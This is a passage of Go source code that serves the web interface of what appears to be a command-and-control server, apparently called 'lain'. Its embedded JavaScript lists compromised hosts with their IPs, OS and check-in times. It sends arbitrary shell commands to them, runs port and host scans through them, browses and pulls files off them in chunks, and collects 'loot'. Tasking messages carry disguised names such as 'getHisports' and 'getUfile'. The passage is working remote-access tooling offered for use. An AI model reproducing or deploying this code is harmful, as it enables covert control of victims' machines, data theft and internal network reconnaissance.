                🔗 intranet
			</a>
			<a href="#" data-target="file">
				📂 Files
			</a>
		</div>
        <div class="content">
            <button class="toggle-button" onclick="toggleSidebar()"></button>
            <div id="index" class="hidden">
                    <p id='div_conn'></p>
                    <script>
                        const l_index = new index();
                        l_index.lain_shell();
                        shell_list=[];
                        function get_conn(uid,shellname){
                            if (shell_list.includes(uid)) {
                                let ms = confirm("You have executed it once, confirm to continue execution");
                                if(ms){
                                    uid = l_index.get(uid,shellname);
                                }
                                return;
                            }
                            uid = l_index.get(uid,shellname)
                            shell_list.push(uid);
                        }
						function del_conn(uid){
							l_index.del(uid)
						}
                    </script>
            </div>
            <div id="userIndex" class="hidden">
            <div class="form">
                <input type="text" id="cmd_value" placeholder="group Commnad">
                <label for='options'>platform:</label>
                <select id='options' name='options'>
                    <option value=''>select</option>
                    <option value='win'>Windows</option>
                    <option value='linux'>Linux</option>
                    <option value='macos'>MacOs</option>
                    <option value='android'>Android</option>
                </select>
                <button type="button" onclick="getAll()">Send</button>
            </div>
                    <p id='div_index'></p>
                    <script>
                        const _index = new lain_index();
                        _index.lain_shell()
                        _index.checkTime()
                        function get(shell){
                            _index.get(shell)
                        }
                        function del(shell){
                            _index.del(shell)
                        }
                        function switchVer(shell,ver){
                            _index.switchVer(shell,ver)
                        }   
                        function getAll(){
                            let shell = document.getElementById('cmd_value').value;
                            let options = document.getElementById('options').value;
                            _index.getAll(options,shell)
                        }
                        function remarks(shell){
                            _index.remarks(shell)
                        }
                        function rate(shell){
                            _index.rate(shell)
                        }
                        function saveInfo(uid){
                            _index.saveInfo(uid)
                        }
                    </script>
            </div>
            <div id="net" class="hidden">
                <div class="net_scan">
                    <select name="net_shell" id="net_shell">
                        <option value="">Select</option>
                    </select>
					<div id="net_uid"></div>
                    <div id="have_ip"></div>
                </div>
                <div class="net_scan">
                    <select id='net_options' name='net_options'>
                        <option value=''>option</option>
                        <option value='scan'>Scan port</option>
                        <option value='sniff'>Scan host</option>
                    </select>
                    <input type="text" id="net_target" placeholder="Target">
                    <input type="text" id="net_target_list" placeholder="[range(1,20,45...)or(1-65534)]">
                    <select name="sleep_time" id="net_sleep_time" onchange="checkCustomOption(this)">
                        <option value="">Select scanning delay time</option>
                        <option value="1">1</option>
                        <option value="2">2</option>
                        <option value="3">3</option>
                        <option value="4">4</option>
                        <option value="5">5</option>
                        <option value="custom">customize</option>
                    </select>
                    <input type="text" id="custom_sleep_time" placeholder="Enter custom time" style="display:none;" />
                    <button onclick="net_send()">Send</button>
                </div>
                <div id="net_div" class="net_div"></div>
                <script>
                    const net = new lain_net();
                    net.getNet();
                    function checkCustomOption(select) {
                        var customInput = document.getElementById('custom_sleep_time');
                        if(select.value === 'custom') {
                            customInput.style.display = 'inline';
                            customInput.focus();
                        } else {
                            customInput.style.display = 'none';
                        }
                    }
                    function net_send(){
                        net.scan()
                    }
                    const selectElement = document.getElementById('net_shell');
                    selectElement.addEventListener('change', function() {
                        net.getshellip();
                    });
                </script>
            </div>
            <div id="file" class="hidden">
                <div id="g_file"></div>
                <script>
                    const loot = new lain_index();
                    function Get_loot(){
                        loot.getloot();
                    }
                    Get_loot()
                </script>
            </div>        
        </div>
    </div>
    <div id="log">
        <div class="resize-handle"></div>
        <div id="log-content">
        </div>
    </div>
    <div id="iframePanel" class="iframe-panel">
        <div class="drag-handle"></div>
        <button class="close-button" onclick="closeIframe()">x</button>
        <iframe id="iframe" src=""></iframe>
    </div>
    <script src="/lain.js"></script>
</body>
</html>`
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, html)
			return
		}
	}
}

//file-html
func file_html() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		usernameCookie, err := r.Cookie("cookie") // 使用 "cookie" 作为 Cookie 名称
        if err != nil {
            http.Error(w, error_str, http.StatusForbidden)
            return
        }
        // 标记是否找到用户
        var foundUser bool
        // 查找用户是否存在于 sessionSlice 中
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        // 如果没有找到用户，返回错误
        if !foundUser {
            http.Error(w, error_str, http.StatusForbidden)
            return
        }
		if r.Method == http.MethodGet {
			html := `<!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <link rel="stylesheet" href="/lain.css">
            </head>
            <body>
                <div class="filecontainer">
                    <div>
                        <label for="splitSize">Enter the split size (each part in MB): </label>
                        <input type="number" id="splitSize" min="1" placeholder="Enter part" />
                    </div>
                    <div id="file" class="file-manager"></div>
                    <form id="uploadForm">
                        <input type="file" id="uploadFile" name="uploadFile" required>
                        <input type="submit" class="dir-btn" value="Upload">
                    </form>
                    <div class="dir-btn" onclick="get_dir(1)">&#x21B6; ../</div>
                    <div class="dir-controls">
                        <p id="cur_dir_p"></p>
                        <input type="text" id="directoryInput">
                        <button id="moveDirButton" onclick="move_dir()">Goto folder</button>
                    </div>
                </div>
                <script src="/lain.js"></script>
                <script>
                    const shell_file = new lain_shell();
                    document.getElementById('uploadForm').addEventListener('submit', function(event) {
                        event.preventDefault(); // 阻止表单默认提交行为
                        var fileInput = document.getElementById('uploadFile');
                        var file = fileInput.files[0];
                        var splitSizeInput = document.getElementById('splitSize');
                        var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                        if (file) {
                            var fileSize = file.size;
                            var formData = new FormData();
                            formData.append('uploadFile', file);
                            formData.append('uid', shell_file.uid);
                            formData.append('filename',file.name);
                            formData.append('splitSize',splitSize);
                            var xhr = new XMLHttpRequest();
                            xhr.open('POST', '/user_index?op=uploadFile', true);
                            xhr.onload = function() {
                                if (xhr.status === 200) {
                                    console.log('File uploaded successfully');
                                    let file_name = shell_file.shell_dir + "/" + file.name;
                                    console.log(fileSize, file_name);
                                    shell_file.loadFile(file.name,fileSize);
                                } else {
                                    alert('The file is being used');
                                }
                            };
                            xhr.send(formData);
                        } else {
                            alert("Please select a file");
                        }
                    });
                    shell_file.look_file("./");
                    function get_dir(get_switch) {
                        let cur_dir = "no";
                        shell_file.move_file(get_switch, cur_dir);
                    }
                    function move_dir(){
                        shell_file.move_dir();
                    }
                    document.addEventListener('DOMContentLoaded', function() {
                        let username = shell_file.username;
                        if (username) {
                            // document.getElementById("username").textContent = username;
                        } else {
                            window.location.href = "about:blank";
                        }
                    });
                </script>
            </body>
            </html>
            `
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, html)
			return
		}
	}
}

//cmd-html
func cmd_html() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		usernameCookie, err := r.Cookie("cookie") // 使用 "cookie" 作为 Cookie 名称
        if err != nil {
            http.Error(w, error_str, http.StatusForbidden)
            return
        }
        // 标记是否找到用户
        var foundUser bool
        // 查找用户是否存在于 sessionSlice 中
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        // 如果没有找到用户，返回错误
        if !foundUser {
            http.Error(w,error_str, http.StatusForbidden)
            return
        }
		if r.Method == http.MethodGet {
			html := `<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="/lain.css">
</head>
<body>
	<div class="shell-container">
		<label for='options' style='margin-right: 10px;'>Select Shell:</label>
		<select id='options' name='options' style='margin-left: 10px;'></select>
	</div>
	<div class="terminal" id="terminal">
		<div class="input-container">
			<div class="prompt">Command></div>
			<input type="text" class="shell-input" id="input" autofocus>
		</div>
	</div>

	<script src="/lain.js"></script>
	<script>
		const shell = new lain_shell();
		const inputElement = document.getElementById('input');
		const terminal = document.getElementById('terminal');
		const inputContainer = terminal.querySelector('.input-container');
		let currentInput = inputElement;
		inputElement.addEventListener('keydown', async function (event) {
			if (event.key === 'Enter') {
				event.preventDefault();
				const command = currentInput.value.trim();
				if (command) {
					shell.get(command);
				}
			}
		});
		document.addEventListener('DOMContentLoaded', function() {
		let urlParams = new URLSearchParams(window.location.search);
		let uid = urlParams.get('uid');
		if (!shell.username) {
			window.location.href = "about:blank";
		}
		fetch('/user_index?op=getOs&uid=' + uid)
		.then(response => response.text())
		.then(data => {
			const optionsElement = document.getElementById('options');
			if (data === 'win') {
				optionsElement.innerHTML = "<option>Shell</option><option value='cmd'>cmd</option><option value='powershell'>powershell</option><option value='custom'>customize shell</option>";
			} else if (data === 'linux' || data === 'macos') {
				optionsElement.innerHTML = "<option>Shell</option><option value='bash'>bash</option><option value='sh'>sh</option><option value='custom'>customize shell</option>";
			} else if (data === 'android') {
				optionsElement.innerHTML = "<option>Shell</option><option value='/system/bin/bash'>/system/bin/bash</option><option value='/system/bin/sh'>/system/bin/sh</option><option value='custom'>customize shell</option>";
			}
		});
	});

	document.getElementById('options').addEventListener('change', function() {
		let selectedValue = this.value;

		if (selectedValue === 'custom') {
			// 用户选择了“自定义...”
			let customEnv = prompt("enter a shell:");

			if (customEnv) {
				// 创建一个新的 <option> 元素
				const newOption = document.createElement("option");
				newOption.value = customEnv;
				newOption.textContent = customEnv;

				// 将新的选项插入到下拉框中
				this.insertBefore(newOption, this.querySelector("option[value='custom']"));

				// 设置新的选项为选中状态
				this.value = customEnv;

				// 通知 shell 切换到自定义环境
				shell.switchVer(customEnv);
			} else {
				// 如果用户取消输入或未输入内容，重置为默认选项
				this.value = "Shell";
			}
		} else {
			// 通知 shell 切换到选定的环境
			shell.switchVer(selectedValue);
		}
	});
	</script>
</body>
</html>
`
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, html)
			return
		}
	}
}

func lain_js() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		usernameCookie, err := r.Cookie("cookie") // 使用 "cookie" 作为 Cookie 名称
        if err != nil {
            http.Error(w,error_str, http.StatusForbidden)
            return
        }
        // 标记是否找到用户
        var foundUser bool
        // 查找用户是否存在于 sessionSlice 中
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        // 如果没有找到用户，返回错误
        if !foundUser {
            http.Error(w,error_str, http.StatusForbidden)
            return
        }
		if r.Method == http.MethodGet {
html := `class index{
    constructor() {
      this.server = window.location.protocol + "//" + window.location.host;
      this.username = this.getCookie("cookie");
    }
    getCookie(name) {
        let cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            let cookieParts = cookie.split('=');
            if (cookieParts[0] === name) {
                return cookieParts[2];
            }
        }
        return null;
    }
      lain_shell(){
        if (this.username){
            let interval_server=this.server+"/user_index?op=listen&username="+this.username;
            setInterval(function(){
                fetch(interval_server)
                .then(response=>{
                    return response.text();
                })
                .then(data=>{
                let div = document.getElementById('div_conn');
                    div.innerHTML=data;
                })
                },3500)
            }
      }
      generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        let result = '';
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
      }

      insertStringAtRandomPosition(mainString, insertString) {
        const position = Math.floor(Math.random() * (mainString.length + 1));
        return mainString.slice(0, position) + insertString + mainString.slice(position);
      }
      get(uid,shellname){
        const randomString = this.generateRandomString(10, 25);
        let encry = this.insertStringAtRandomPosition(randomString, '010011010010011001');
        let confirm1 = confirm('confirm?');
        if(confirm1){
            let key_url= this.server+"/user_index?op=insertKey&uid="+uid+"&username="+this.username+"&request="+shellname;
            let msg_url= this.server+"/user_index?op=msg&uid="+uid+"&msg="+encry;
            fetch(key_url,{
                credentials: 'include' // 发送 cookie
            })
            fetch(msg_url, {
                credentials: 'include' // 发送 cookie
            })
                return uid
            }
        }
        del(uid){
            let right = confirm('confirm?');
            let ms = confirm('ok');
            if (right && ms){
                document.getElementById("container-"+uid)?.remove();
                fetch(this.server+"/user_index?op=delIndex&uid="+uid)
                .then(response=>response.text())
                .then(data=>{
                })
            }
        }
      }
      
      class lain_shell{
        constructor() {
            this.server = window.location.protocol + "//" + window.location.host;
            const urlParams = new URLSearchParams(window.location.search);
            this.uid=urlParams.get('uid');
            this.username=this.getCookie("cookie");
            // this.results=document.getElementById('results').innerHTML;
            // document.getElementById('shellname').innerText=this.shellname;
            this.shell_dir = '';
            this.isMovingFile = false;
            this.move_file = this.move_file.bind(this);
            this.look_file = this.look_file.bind(this);
            this.intervalId = null;
            this.currentInput="";
            this.inputContainer="";
            this.inputKeydown = this.inputKeydown.bind(this);
            this.init();
        }

        init(){
            fetch(this.server+"/user_index?op=getCurrentDir&uid="+this.uid)
            .then(response => response.text())
            .then(data => {
                this.shell_dir = data;
                console.log(this.shell_dir);
            })
        }

        getCookie(name) {
            let cookies = document.cookie.split('; ');
            for (let i = 0; i < cookies.length; i++) {
                let cookie = cookies[i];
                let cookieParts = cookie.split('=');
                if (cookieParts[0] === name) {
                    return cookieParts[2];
                }
            }
            return null;
        }      
        async lain_time() {
            if (this.uid) {
                let interval_server =this.server+"/user_index?op=getResults&uid="+this.uid;
                let self = this;
                if (this.intervalId) {
                    clearInterval(this.intervalId);
                }
                return new Promise((resolve, reject) => {
                    this.intervalId = setInterval(async function () {
                        try {
                            let response = await fetch(interval_server, {
                                method: 'GET',
                                headers: {
                                    'Referer': 'http://localhost/html/lain.js',
                                }
                            });
                            let data = await response.text();
                            if (data) {
                                const output = document.createElement('div');
                                output.contentEditable = true;
                                output.textContent = data;
                                output.className = 'output';
                                const inputContainer = terminal.querySelector('.input-container');
                                inputContainer.appendChild(output);
                                terminal.scrollTop = terminal.scrollHeight;
                                clearInterval(self.intervalId);
                                self.intervalId = null;
                                resolve(true);
                            }
                        } catch (error) {
                            console.error('Error:', error);
                            reject(false);
                        }
                    }, 1000);
                });
            } else {
                console.log('uid为空');
                return false;
            }
        }
        async get(command){
            if(command === "--help" && this.uid){
                const output = document.createElement('div');
                output.className = 'output';
                output.contentEditable = true;
                output.textContent = '--help: View help information\n' +
                    'time: check delay\n' +
                    'sleep: switch delay\n' +
                    'scan: scan port(1-65535,scan [IP] [range(1,20,45...)or(1-65534)] [delay])\n' +
                    'sniff: scan host(sniff [net] [range(1,20,45...)or(1-253)] [delay])\n';
                const inputContainer = terminal.querySelector('.input-container');
                inputContainer.appendChild(output);
                this.createInput();
            } else if (command.startsWith("sleep") && this.uid) {
                this.sendjob("delay");
                var powershell = "getTime^";
                let time = command.split(" ")[1];
                fetch(this.server+"/user_index?op=getTime&uid="+this.uid+"&time="+time,{
                    credentials: 'include'
                })
                .then(response => response.text())
                .then(data => {
                    fetch( this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell),{
                        credentials: 'include' 
                    })
                    .then(response => {})
                    .then(data => {
                        this.createInput();
                    })
                })
            } else if (command.startsWith("scan") && this.uid) {
                this.sendjob('scan...'); // 创建新的提示符
                (async () => {
                    let target = command.split(" ")[1];
                    let port_list = command.split(" ")[2];
                    let sleep_time = command.split(" ")[3];
                    let powershell = "getHisports^"+target+"^"+port_list+"^"+sleep_time+"^whatever";
                    let url = this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell);
                    try {
                        await fetch(url,{
                            credentials: 'include' // 发送 cookie
                        });
                    } catch (error) {
                        console.error("Error fetching command:", error);
                    }
                })();
                let flag = await this.lain_time();
                if (flag) {
                    this.createInput();
                }
            } else if (command.startsWith("sniff")) {
                this.sendjob('sniff...'); // 创建新的提示符
                (async () => {
                    let target = command.split(" ")[1];
                    let sniff_list = command.split(" ")[2];
                    let sleep_time = command.split(" ")[3];
                    let powershell = "getUfriends^"+target+"^"+sniff_list+"^"+sleep_time+"^whatever";
                    let url = this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell);
                    try {
                        await fetch(url,{
                            credentials: 'include' // 发送 cookie
                        });
                        this.createInput();
                    } catch (error) {
                        console.error("Error fetching command:", error);
                    }
                })();
                let flag = await this.lain_time();
                if (flag) {
                    this.createInput();
                }
            }else if(this.uid){
                this.sendjob('shell'); // 创建新的提示符
                let url = this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(command);
                await fetch(url,{
                    credentials: 'include' // 发送 cookie
                });
                let flag = await this.lain_time();
                if (flag) {
                    this.createInput();
                }
            }
        }
        input(){
            const inputElement = document.getElementById("input");
            currentInput = inputElement;
            inputElement.addEventListener("keydown", (event) => { // 使用箭头函数
                if (event.key === "Enter") {
                    event.preventDefault();
                    const command = currentInput.value.trim();
                    if (command) {
                        this.get(command); // this 现在指向正确的上下文
                    }
                }
            })
        }
        async sendjob(str){
            const newPrompt = document.createElement('div');
            newPrompt.className = 'output';
            newPrompt.textContent = str+' SendMsg--->>';
            const terminal = document.getElementById("terminal");
            const inputContainer = terminal.querySelector(".input-container");
            inputContainer.appendChild(newPrompt);
        }
        createInput() {
            const newPrompt = document.createElement('div');
            newPrompt.className = 'output';
            newPrompt.textContent = 'Command>';
            const newInput = document.createElement('input');
            newInput.type = 'text';
            newInput.className = 'shell-input';
            newInput.addEventListener('keydown', this.inputKeydown);
            currentInput.value = '';
            inputContainer.appendChild(newPrompt);
            inputContainer.appendChild(newInput);
            newInput.focus();
            currentInput = newInput;
        }
        async inputKeydown(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                const command = currentInput.value.trim();
                if (command) {
                    await this.get(command);
                    let flag = await this.lain_time();
                    if (flag) {
                        createInput();
                    }
                }
            }
        }
        async loadFile(file_name,fileSize){
            if(fileSize && file_name){
                var splitSizeInput = document.getElementById('splitSize');
                var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                let file_key =  this.uid + "*" + file_name + "*" + splitSize
                var powershell = "loadUfile^"+file_key;
                fetch(this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell))
                .then(response => response.text())
                .then()
                return true;
            }
        }
        async getFile(path){
            if(path){
                var splitSizeInput = document.getElementById('splitSize');
                var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                let file_name = path.replace(/\s?\(Size:.*\)/, "");
                var powershell = "getUfile^"+file_name+"^"+splitSize;
                fetch(this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell))
                .then(response => response.text())
                .then()
            }
        }
        async look_file(dir) {
            if (this.uid && dir) {
                let powershell = "lookUpFile^"+dir;
                try {
                    await fetch(this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell));
                    while (true) { 
                        await new Promise(resolve => setTimeout(resolve, 5000));
                        let fileResponse = await fetch(this.server+"/user_index?op=getFileList&uid="+this.uid);
                        let data = await fileResponse.text();
                        if (data) {
                            let div_file = document.getElementById('file');
                            div_file.innerHTML = '';
                            let dir_list = data.split("\n");
                            for (let i = 0; i < dir_list.length; i++) {
                                let file = dir_list[i].trim(); // 移除空白字符
                                if (file !== "") { // 确保文件名不为空且长度大于3
                                    let file_name = file.slice(3).trim(); // 获取文件名并移除空白字符
                                    if (file_name !== "" && file_name !== "\n") {
                                        let new_file = document.createElement('div');
                                        new_file.classList.add('directory'); // 初始添加 'directory' 类
                                        // 根据文件类型添加图标或不同的样式
                                        if (file.startsWith("dir")) {
                                            new_file.innerHTML = "<span class=\"icon-dir\">📁</span> "+file_name; // 目录图标
                                            new_file.addEventListener('click', () => {
                                                this.move_file(0, file_name);
                                            });
                                            new_file.classList.add('dir'); // 添加目录特有的类
                                        } else if (file.startsWith("fil")) {
                                            new_file.innerHTML = "<span class=\"icon-file\">📄</span>"+file_name+"<span class=\"icon-download\" style=\"cursor: pointer;\">⬇️</span>";
                                            new_file.classList.add('file');
                                            new_file.addEventListener('click', () => {
                                                this.getFile(dir+"/"+file_name);
                                            });
                                            const downloadIcon = new_file.querySelector('.icon-download');
                                            downloadIcon.addEventListener('click', (event) => {
                                                event.stopPropagation();
                                                this.getFile(dir+"/"+file_name);
                                            });
                                        }
                                        // 添加换行可以使用 CSS
                                        if (new_file.innerText !== "") {
                                            div_file.appendChild(new_file);
                                        }
                                    }
                                }
                            }
                            return true;
                        } else if (data == "is empty") {
                            return false;
                        }
                    }
                } catch (error) {
                    console.error('Viewing directory failed:', error);
                }
            }
        }
        async move_file(num, cur_dir) {
            let cur_dir_p = document.getElementById("cur_dir_p");
            if (this.isMovingFile) {
                console.log("Don't move around....");
                return;
            }
            this.isMovingFile = true;
            try {
                if (this.uid) {
                    let temp_dir = this.shell_dir;
                    if (num === 1 && cur_dir === 'no') {
                        this.shell_dir += '/..';
                    } else if (num === 0) {
                        this.shell_dir += "/"+cur_dir;
                    }
                    // 等待 look_file 函数完成
                    let flag = await this.look_file(this.shell_dir);
                    if (!flag) {
                        this.shell_dir = temp_dir; // 如果 look_file 返回 false，则回退目录
                        alert("!Does not exist or has no permission to access this directory?")
                    }
                    console.log(this.shell_dir);
                }
            } catch (error) {
                console.error("An error occurred in move_file:", error);
            } finally {
                // 无论函数成功还是失败，都确保重置标志
                cur_dir_p.textContent="Path:\t"+this.shell_dir;
                this.isMovingFile = false;
            }
        }
        async move_dir(){
            let cur_dir_p = document.getElementById("cur_dir_p");
            let temp_dir = this.shell_dir;
            let directory = document.getElementById("directoryInput").value;
            this.shell_dir = directory;
            let flag = await this.look_file(this.shell_dir);
            if (!flag) {
                this.shell_dir = temp_dir; // 如果 look_file 返回 false，则回退目录
                console.log("!Does not exist or has no permission to access this directory?")
            }
            console.log(this.shell_dir);
            cur_dir_p.textContent="Path:\t"+this.shell_dir;
        }

        get_btn_move(){
            var btn = document.getElementById('dir-btn');
            btn.addEventListener('click', async () => {
                this.move_file(1,'no')
            })
        }

        switchVer(value){
            let cmd = "SwUVer^"+value;
            fetch(this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(cmd))
        }
    }
    
    //主页面类
    class lain_index{
        constructor() {
            this.server = window.location.protocol + "//" + window.location.host;
            this.username = this.getCookie("cookie");
            this.User_data = [];
            this.check_time = [];
            this.check_uid = [];
        }
        
        getCookie(name) {
            let cookies = document.cookie.split('; ');
            for (let i = 0; i < cookies.length; i++) {
                let cookie = cookies[i];
                let cookieParts = cookie.split('=');
                if (cookieParts[0] === name) {
                    return cookieParts[2];
                }
            }
            return null;
        }
        lain_shell() {
            if (this.username) {
                let container = document.getElementById('div_index');
                setInterval(() => {
                    let interval_server = this.server + "/user_index?op=userIndex&username=" + this.username + "&clientsCount=" + Object.keys(this.User_data).length;
                    fetch(interval_server)
                        .then(response => {
                            if (!response.ok && response.status === 400) {
                                return response.text(); 
                            }
                            if (response.ok) {
                                if (response.headers.get('Content-Type').includes('application/json')) {
                                    return response.json();
                                } else {
                                    return {};
                                }
                            } else {
                                return {};
                            }
                        })
                        .then(data => {
                            if (data === 'noNeeded') {
                                return;
                            } else if (Array.isArray(data) && data.length > 0) {
                                this.User_data = data;
                                net_init(this.User_data);
                                this.User_data.forEach(key => {
                                    let userDiv = document.getElementById(key['uid'] + "info");
                                    if (!userDiv) {
                                        userDiv = document.createElement('div');
                                        userDiv.classList.add('ip-info');
                                        userDiv.id = key['uid'] + "info";
                                        container.appendChild(userDiv);
                                    }
                                    let osEmoji = "💻";
                                    if (key['os'].toLowerCase().includes("linux")) {
                                        osEmoji = "🐧";
                                    } else if (key['os'].toLowerCase().includes("macos")) {
                                        osEmoji = "🍏";
                                    } else if (key['os'].toLowerCase().includes("android")) {
                                        osEmoji = "🤖";
                                    }
                                    let userHTML = '<div class="conn-container">' +
                                                        '<span class="shell-address">' + key['external_ip'] + '/</span>' +
                                                        '<span class="ip-address">' + key['host'] + '/</span>' +
                                                        '<span class="ip-address">' + key['uid'] + '/</span>' +
                                                        '<div class="os-container">' +
                                                            '<div class="ip-address" id="' + key['uid'] + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>'+
                                                            '<span class="ip-address">'+osEmoji + '/'+ key['os'] + '</span>' +
                                                        '</div>' +
                                                    '</div>' +
                                                    '<div class="button-container">' +
                                                        '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'info\')">[info]</button>' +
                                                        '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'choose\')">[☰]</button>' +
                                                        '<button class="console-link" onclick="del(\'' + key['uid'] + '\')">🗑️</button>' +
                                                    '</div>' +
                                                    '<div class="info-content" id="' + key['uid'] + '-info-content">' +
                                                        '<p><strong class="s_left">Remarks:</strong><input type="text" value="' + key['Remarks'] + '" id="remarks_' + key['uid'] + '"class="s_right_input custom-remarks"></p>' +
                                                        '<p><strong class="s_left">Path:</strong><strong  class="s_right">' + key['currentDir'] + '</strong></p>' +
                                                        '<p><strong class="s_left">Host:</strong><strong class="s_right">' + key['host'] + '</strong></p>' +
                                                        '<p><strong class="s_left">IP Addresses:</strong><strong class="s_right">' + key['local_ip'] + '</strong></p>' +
                                                        '<p><strong class="s_left">check:</strong><strong class="s_right">' + key['checkTime'] + '</strong></p>' +
                                                        '<p><strong class="s_left">OS:</strong><strong class="s_right">' + key['os'] + '</strong></p>' +
                                                        '<p><strong class="s_left">Time:</strong><input type="text" value="' + key['Delay'] + '" id="delay_' + key['uid'] + '"class="s_right_input custom-remarks"></p>' +
                                                        '<p><strong class="s_left">UID:</strong><strong class="s_right">' + key['uid'] + '</strong></p>' +
                                                        '<p><strong class="s_left">Username:</strong><input type="text" value="' + key['username'] + '" id="username_' + key['uid'] + '"class="s_right_input custom-remarks"></p>' +
                                                        '<button class="console-link" onclick="saveInfo(\'' + key['uid'] + '\')">Save Changes</button>' +
                                                    '</div>' +
                                                    '<div class="choose-content" id="' + key['uid'] + '-choose-content">' +
                                                        '<button class="console-link" onclick="openIframe(\'/cmdHtml?uid=' + key['uid'] + '\')">💻</button>' +
                                                        '<button class="console-link" onclick="openIframe(\'/fileHtml?uid=' + key['uid'] + '\')">🗂️</button>' +
                                                    '</div>';
                                    userDiv.innerHTML = userHTML;
                                });
                            } else if((Array.isArray(data) && data.length == 0)) {
                                console.log("No data available, clearing container.");
                                container.innerHTML = '';
                            }
                        })
                        .catch(error => {
                            console.error("Error fetching data:", error);
                        });
                }, 5000);
            }
        }
        
        saveInfo(uid) {
            const remarks = document.getElementById('remarks_' + uid).value;
            const delay = document.getElementById('delay_' + uid).value;
            const username = document.getElementById('username_' + uid).value;
            fetch(this.server + "/user_index?op=change", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    remarks: remarks,
                    delay: delay,
                    username: username,
                    uid: uid,
                })
            })
            .then(response => response.text())
            .then(data => {
                if (data === 'confirm') {
                    console.log("Changes saved!");
                    const userIndex = this.User_data.findIndex(client => client.uid === uid);
                    if (userIndex !== -1) {
                        this.User_data[userIndex].remarks = remarks;
                        this.User_data[userIndex].delay = delay;
                        this.User_data[userIndex].username = username;
                    }
                    this.updateUserUI(uid, remarks, delay, username);
                } else {
                    let new_user = document.getElementById('username_' + uid).value;
                    if(new_user){
                        let change_url = this.server + "/user_index?op=confirm&uid=" + uid + "&username=" + new_user;
                        fetch(change_url)
                            .then(response => response.json())
                            .then(clients => {
                                const userIndex = this.User_data.findIndex(client => client.uid === uid);
                                if (userIndex !== -1) {
                                    this.User_data[userIndex].remarks = remarks;
                                    this.User_data[userIndex].delay = delay;
                                    this.User_data[userIndex].username = username;
                                }
                                this.updateUserUI(uid, remarks, delay, username);
                            });
                    }
                }
            })
            .catch(error => {
                console.error("Error saving changes:", error);
            });
            if (username !== this.username) {
                const userIndex = this.User_data.findIndex(client => client.uid === uid);
                if (userIndex !== -1) {
                    this.User_data.splice(userIndex, 1);
                }
                let userDiv = document.getElementById(uid+"info");
                if (userDiv) {
                    userDiv.remove();
                }
            }
        }
        updateUserUI(uid, remarks, delay, username) {
            document.getElementById('remarks_' + uid).value = remarks;
            document.getElementById('delay_' + uid).value = delay;
            document.getElementById('username_' + uid).value = username;
        }
        checkTime() {
            if (this.username) {
                let check_url = this.server + "/user_index?op=checkTime&username=" + this.username;
                setInterval(() => {
                    fetch(check_url)
                        .then(response => {
                            if (response.ok && response.headers.get('Content-Type').includes('application/json')) {
                                return response.json();
                            } else {
                                throw new Error("Invalid JSON response");
                            }
                        })
                        .then(data => {
                            this.check_time.forEach(item => {
                                let userDiv = document.getElementById(item.uid + "info");
                                if (userDiv) {
                                    let imgElement = document.getElementById(item.uid + "-img");
                                    if (imgElement) {
                                        if (item.checkTime !== data.find(i => i.uid === item.uid)?.checkTime) {
                                            imgElement.outerHTML = '<img class="ip-address" id="' + item.uid + '-img" src="rhythm.gif" style="width: 106px; height: 46px; display: inline-block; vertical-align: middle;"/>';
                                        } else {
                                            imgElement.outerHTML = '<div class="ip-address" id="' + item.uid + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>';
                                        }
                                    }
                                }
                            });
                            console.log(this.check_time,data);
                            this.check_time = data;
                        })
                        .catch(error => {
                            console.error("Error fetching data:", error);
                        });
                }, 5000);
            }
        }
        
        del(shell) {
            let right = confirm('Confirm to remove?');
            if (right) {
